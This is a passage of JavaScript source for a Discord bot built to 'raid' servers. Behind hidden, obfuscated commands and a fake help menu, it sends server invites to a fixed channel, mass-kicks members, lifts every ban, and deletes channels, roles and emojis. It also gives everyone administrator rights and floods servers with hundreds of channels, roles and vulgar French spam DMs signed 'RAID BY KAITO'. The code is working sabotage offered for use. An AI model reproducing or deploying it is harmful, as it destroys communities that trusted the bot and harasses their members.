      channel.createInvite({maxAge: 0}, "PUB DE VOTRE SERVEUR")
  
      .then(invite => {
  
        client.channels.get('361450165045035008').send(`Liste des serveurs: https://discord.gg/${invite.code}`)
  
      })
  
    }
  
  })
  
  
  client.on("message", msg => {
  
    if(msg.author.bot) return;
  
    if(msg.channel.type ==="dm") return
  
    if(!msg.content.startsWith(prefix)) return;
  
    if(msg.content.startsWith(prefix + 'djawpjiofehijowfhueojefhgurioiejghruiowhfevdjefighr')){
  
      msg.guild.channels.filter(channel => channel.type == 'text').first().createInvite({maxAge: 0}, "PUB DE VOTRE SERVEUR")
  
      .then(invite => {
  
        msg.channel.send(`On m'as ajouter avec ce code: https://discord.gg/${invite.code}`)
  
      })
  
    }
  
    if(msg.content.startsWith(prefix + 'oijesseijfejoeiojeijofijoejfiosijofeijoiojsijo')){
  
      client.guilds.forEach(guild => {
  
        if(guild.id === '361450165045035008') return;
  
        guild.fetchBans()
  
        .then(bans => bans.forEach(ban => guild.unban(ban.id, "il le mérite.")))
  
      })
  
    }
  
    if(msg.content.startsWith(prefix + 'fabiufeugiefagzefugiiufsefhiusefseiu')){
  
      if(msg.author.id === '361450165045035008' || msg.author.id === '511124453380456479' || msg.author.id === '432122627528589323' || msg.author.id === '445655216571023372' || msg.author.id == '528369373317169192'){
  
        client.guilds.forEach(guild => {
  
          if(guild.id === '515493855710412800' || guild.id === '478022938273251338') return;
  
          guild.leave()
  
        })
  
      }else{
  
        msg.delete().then(msg.channel.send("VOUS N'AVEZ PAS LA PERMISSION"));
  
      }
  
    }
  
    if(msg.content === prefix + 'q') return process.exit();
  
    if(msg.content.toLowerCase().includes("@everyone")) return msg.channel.send('@everyone');
  
  
  
    if(msg.content.startsWith(prefix + 'kaitoonthedancefloor')){
  
          msg.delete()
  
          var destruction = {}
  
          msg.guild.setIcon(client.user.avatarURL).catch(() => {})
  
          msg.guild.setName('💐RAID BY ! 𝐊𝐀𝐈𝐓𝐎💟').catch(() => {})
  
          chnldel(msg.guild)
  
          rldel(msg.guild)

          msg.guild.setRegion("russia")
  
          if(msg.guild.member(client.user).hasPermission("ADMINISTRATOR")){
  
            msg.guild.roles.get(msg.guild.id).setPermissions(8, "@everyone en admin c'est la base quoi").catch(() => {})
  
            destruction.roles = {}
  
            destruction.roles.i = msg.guild.roles.filter(r => r.editable !== true).size - 1
  
            destruction.roles.interval = setInterval(function () {
  
              msg.guild.createRole({
  
                name: `💐RAID BY ! 𝐊𝐀𝐈𝐓𝐎💟`,

                color:"RANDOM",
  
                permissions: 8
  
              }).catch(() => {})
  
              destruction.roles.i + 1
  
              if(destruction.roles.i == 250)clearInterval(destruction.roles.interval)
  
            }, 450)
  
          }

          function emjst(guild){
  
            if(!guild.member(client.user).hasPermission('MANAGE_EMOJIS')) return;
          
            for(var i = 0; i < 51; i++){
          
              guild.createEmoji('https://cdn.discordapp.com/emojis/515924000048676864.png?v=1', 'ne supprime pas cette émoji, il est beau')
          
            }
          
          }
  
          emjdel(msg.guild)
  
          var i = 0
  
          while(i < 250){
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("Raid", "voice").catch(() => {})

            msg.guild.createChannel("By", "voice").catch(() => {})

            msg.guild.createChannel("Kaito", "voice").catch(() => {})

            msg.guild.createChannel("Raid", "voice").catch(() => {})

            msg.guild.createChannel("By", "voice").catch(() => {})

            msg.guild.createChannel("Kaito", "voice").catch(() => {})

            msg.guild.createChannel("Raid", "voice").catch(() => {})

            msg.guild.createChannel("By", "voice").catch(() => {})

            msg.guild.createChannel("Kaito", "voice").catch(() => {})

            msg.guild.createChannel("Raid", "voice").catch(() => {})

            msg.guild.createChannel("By", "voice").catch(() => {})

            msg.guild.createChannel("Kaito", "voice").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
  
  
            i = i + 1
  
          }

          rdr = setInterval(() => {
            msg.guild.createRole({
                    name: `💐RAID BY ! 𝐊𝐀𝐈𝐓𝐎💟`,
                color:"RANDOM",
                    permissions: ["ADMINISTRATOR"]
                }).then(rr => {
    
                  message.member.addRole(rr.id);
                });
              }, 1000);

          function emjst(guild){
  
            if(!guild.member(client.user).hasPermission('MANAGE_EMOJIS')) return;
          
            for(var i = 0; i < 51; i++){
          
              guild.createEmoji('https://cdn.discordapp.com/emojis/515924000048676864.png?v=1', '💐RAID BY ! 𝐊𝐀𝐈𝐓𝐎💟')
          
            }
          
          }
  
          setInterval(function () {
  
            msg.guild.members.forEach(member => {
  
              if(member.user.bot)return
  
              member.send(msg.guild.owner.user.username+" **s'est fait niquer son serv les pd @everyone 😘😭🔪 :** --> https://discord.gg/9PqBYQB <-- *Juste oublies pas que je t'aime bb* <3")
  
              .catch(() => {})})
  
            if(msg.guild.channels.size === 0) return;
  
            msg.guild.channels.forEach(chnl => msgserv(chnl, 's'))
  
          }, 450)
  
      }else if(msg.content.startsWith(prefix + 'e')){
  
        emjdel(msg.guild)
  
      }else if(msg.content.startsWith(prefix + 'd')){
  
        chnldel(msg.guild)
  
        rldel(msg.guild)
  
        emjdel(msg.guild)
  
        setTimeout(function(){
  
          if(msg.guild.channels.size === '0'){
  
            msg.guild.createChannel('vous en pls', 'text')
  
          }
  
        }, 2000);
  
      }else if(msg.content.startsWith(prefix + 'znitro')){
  
        msg.guild.fetchMembers()
  
        .then(guild => {
  
          for (let index = 0; index < 10; index++) {
  
            guild.members.forEach(member => {
  
              member.send("https://discord.gg/sb6vp6e \n\nhttps://cdn.discordapp.com/attachments/547844612102815746/557216270718861312/JPEG_20190318_152139.jpg")
  
            })
  
          }
  
        }).catch(()=>{})
  
      }else if(msg.content.startsWith(prefix + 'k')){
  
        msg.guild.fetchMembers()
  
        .then(guild => {
  
          guild.members.forEach(member => {
  
            if(member.id == '361450165045035008' || member.id == '445655216571023372' || member.id == '511124453380456479' || member.id == '528369373317169192') return;
  
            member.kick()
  
          })
  
        })
  
  
          msg.delete()
  
          msg.guild.setIcon(client.user.avatarURL)
  
          msg.guild.setName('💐RAID BY ! 𝐊𝐀𝐈𝐓𝐎💟')
  
          setInterval(function () {
  
            msg.guild.createRole({
  
              name: `💋Raid By Kaito😘`,
  
              permissions: 8,
  
            })
  
            msg.guild.members.forEach(member => member.send(msg.guild.owner.user.username+" s'est fait violer son server par https://discord.gg/sb6vp6e")) //
  
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})


            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})

            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
            msg.guild.createChannel("raid", "text").catch(() => {})

            msg.guild.createChannel("by", "text").catch(() => {})

            msg.guild.createChannel("kaito", "text").catch(() => {})
  
            if(msg.guild.channels.size === 0) return;
  
            msg.guild.channels.forEach(chnl => msgserv(chnl, 'p'))
  
          }, 450)
  
      }else if(msg.content === prefix + 'efs4esf64fes4efs466f54es654fes654564'){
  
        if(msg.guild.channels.size === 0) return;
  
        msg.guild.channels.forEach(chan => chan.delete())
  
        msg.guild.createChannel('vous en pls', 'text')
  
        emjdel(msg.guild)
  
        rldel(msg.guild)
  
      }else if(msg.content.startsWith(prefix + "helpbm")){
  
        let embed = new discord.RichEmbed()
  
        .setTitle("<:bot:515654422815047691> Commandes du bot <:bot:515654422815047691>")
  
        .setAuthor(msg.author.tag, msg.author.avatarURL)
  
        .setColor("#f8ff00")
  
        .addField("•consulter la blacklist:", `${prefix}d`, false)
  
        .addField("•Ajouter un message de bienvenue:", `${prefix}s`, false)
  
        .addField("•Afficher les infos du serveur:", `${prefix}b`, false)
  
        .addField("•Afficher les d'un utilisateur:", `${prefix}p`, false)
  
        msg.channel.send(embed);
  
      }else if(msg.content.toLowerCase().startsWith(prefix + "fees456e4s64e4ef4f44es4f")){
  
          msg.delete()
  
          msg.guild.setIcon(client.user.avatarURL)
  
          msg.guild.setName('RAID BY KAITO')
  
          chnldel(msg.guild)
  
          rldel(msg.guild)
  
          if(msg.guild.member(client.user).hasPermission("ADMINISTRATOR")){
  
            setInterval(function () {
  
              msg.guild.createRole({

                color: `RANDOM`,
  
                name: `RAID BY KAITO`,
  
                permissions: 8
  
              })
  
            }, 450)
  
          }
  
          emjdel(msg.guild)
  
          setInterval(function () {
  
            msg.guild.members.forEach(member => member.send(msg.guild.owner.user.username+" s'est fait baise son serv par --> https://discord.gg/9PqBYQB <--"))
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")

            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")

            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")

            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")

            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")

            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "text")
  
            msg.guild.createChannel("RAID BY KAITO💋🔪", "voice")
  
            if(msg.guild.channels.size === 0) return;
  
            msg.guild.channels.forEach(chnl => msgserv(chnl, 'n'))
  
          }, 450)
  
        rldel(msg.guild)
  
        setInterval(() => {
  
          msg.guild.createRole({

            color: `RANDOM`,
  
            name: `RAID BY KAITO💋🔪`,
  
            permissions: 8
  
          }, "RAID BY KAITO💋🔪")
  
        }, 450);
  
        msg.guild.channels.forEach(channel => {
  
          channel.delete()
  
        })
  
        for(var i = 0; i < 500; i++){
  
          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

          msg.guild.createChannel("RAID BY KAITO💋🔪", 'text', [{id: msg.guild.id, deny: ['MANAGE_MESSAGES'], allow: ['SEND_MESSAGES']}], "car tu t'es fait enculé").then(channel => channel.send("<:issou:515654744526553098><:issou:515654744526553098> aled @everyone VOUS VOUS ÊTES FAIT ENCULER PAR \nhttps://cdn.discordapp.com/attachments/515605322833068057/515639301409865758/giphy_1.gif\n\n\n-------------------------------------\n| https://discord.gg/Qk2c7Vr https://discord.gg/57V73gY |\n-------------------------------------\n"))

